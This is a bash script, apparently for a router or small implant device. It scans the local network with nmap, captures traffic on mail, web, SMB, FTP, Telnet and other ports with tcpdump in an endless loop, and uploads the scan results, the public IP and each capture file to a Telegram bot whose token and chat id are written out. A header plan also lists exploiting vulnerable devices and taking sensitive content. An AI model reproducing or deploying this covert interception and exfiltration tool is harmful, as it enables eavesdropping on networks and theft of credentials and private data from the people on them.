#1. Get Network name
#2. Get Public Ip
#3. Find all Devices connected
	#3.1 Find vulnerability devices
	#3.2 Exploit vulnerability devices
#4. Intercept all traffic
	#4.1 Get Sensitive content

#!/bin/bash
wget -q --spider http://google.com
current_date=$(date "+%d-%m-%Y")
if [ $? -eq 0 ]; then
	echo "Internet ok"
	
	# Installing dependencies
	echo "Install dependencies"
	opkg update
	opkg install nmap
	opkg install tcpdump
	echo "Dependencies ok"
	sleep 1
	
	# Create a file on SD to save results
	echo "Start scanning..."
	nmap_output_file="nmap_scan_$current_date.txt"
	touch $nmap_output_file
	ip_address=$(ip addr show wlan0 | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1)	
	#Start scanning
	nmap -sS -O -sV $ip_address/24 >> $nmap_output_file
	echo "Scanning complete"
	
	# Get public IP
	public_ip=$(curl -s https://ifconfig.me/ip)
	echo "Public ip: $public_ip"
	
	# Send report via telegram
	token="5506183591:AAEL6myAZ8xZcVsMDzDx6Fgz6gUhTWo-pMk"
	# chat id
	chat_id="1789487661"
	filepath1=$nmap_output_file
	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="$public_ip"
	curl -F chat_id="$chat_id" -F document=@"$filepath1" "https://api.telegram.org/bot$token/sendDocument"
	rm "$filepath1"
	
	echo "Start intercepting..."
	while true
	do
		# Max size of file .pcap
		MAX_FILE_SIZE=200000000  # 200MB in byte
		# Name of file 
		tcpdump_output_file="intercept$current_date.pcap"
		# Filter to apply at tcpdump
		filter_tcpdump="(tcp port 25 or tcp port 80 or tcp port 8080 or tcp port 443 or tcp port 445 or tcp port 137 or tcp port 139 or tcp port 21 or tcp port 23 or udp port 69 or udp portrange 10000-20000)"
		# Start tcpdump to capture traffic and save all on file .pcap
		tcpdump -i any -s 0 -w "$tcpdump_output_file" "$filter_tcpdump" &
		# Save PID of tcpdump process
		tcpdump_pid=$!
		# Cicle while to check size of file .pcap
		while true; do
		    # Obtain current size of file .pcap
		    FILE_SIZE=$(stat -c%s "$tcpdump_output_file")
		    # If the size > 200mb stop tcpdump process 
		    if [ "$FILE_SIZE" -ge "$MAX_FILE_SIZE" ]; then
		        kill -SIGINT "$tcpdump_pid"
		        break
		    fi
		    # Else wait 1 second before to check size of file .pcap
		    sleep 1
		done
		filepath2=$tcpdump_output_file
		# Send file via telegram
		curl -F chat_id="$chat_id" -F document=@"$filepath2" "https://api.telegram.org/bot$token/sendDocument"
		rm "$filepath2"
	done
else
  	echo "Internet not ok"
fi

#ottiene tutte le reti wifi presenti nella zona
#<iwlist wlan0 scanning | egrep 'Cell |Encryption|Quality|Last beacon|ESSID' > result.txt
